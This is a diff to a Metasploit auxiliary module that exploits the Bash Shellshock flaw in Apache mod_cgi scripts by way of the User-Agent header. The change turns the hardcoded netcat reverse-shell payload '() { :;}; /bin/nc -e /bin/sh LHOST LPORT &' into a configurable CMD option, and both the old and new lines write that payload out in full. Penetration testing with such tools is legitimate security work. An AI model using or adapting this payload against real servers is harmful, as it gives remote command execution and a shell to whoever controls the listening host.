@@ -17,7 +17,8 @@ class Metasploit4 < Msf::Auxiliary
         variables in Bash, specifically targeting Apache mod_cgi scripts through
         the HTTP_USER_AGENT variable.
 
-        Netcat with the -e (GAPING_SECURITY_HOLE) option is required.
+        If you use the default CMD, please change LHOST and LPORT. Also, you
+        will need a Netcat with the -e (GAPING_SECURITY_HOLE) option.
       },
       'Author' => [
         'Stephane Chazelas', # Vulnerability discovery
@@ -34,8 +35,7 @@ class Metasploit4 < Msf::Auxiliary
 
     register_options([
       OptString.new('TARGETURI', [true, 'Path to CGI script']),
-      OptAddress.new('LHOST', [true, 'Local host for reverse shell']),
-      OptPort.new('LPORT', [true, 'Local port for reverse shell'])
+      OptString.new('CMD', [true, 'Command to run (absolute paths required)', '/bin/nc -e /bin/sh LHOST LPORT &'])
     ], self.class)
   end
 
@@ -44,7 +44,7 @@ class Metasploit4 < Msf::Auxiliary
       send_request_cgi(
         'method' => 'GET',
         'uri' => normalize_uri(target_uri.path),
-        'agent' => "() { :;}; /bin/nc -e /bin/sh #{datastore['LHOST']} #{datastore['LPORT']} &"
+        'agent' => "() { :;}; #{datastore['CMD']}"
       )
     rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
            Rex::HostUnreachable => e
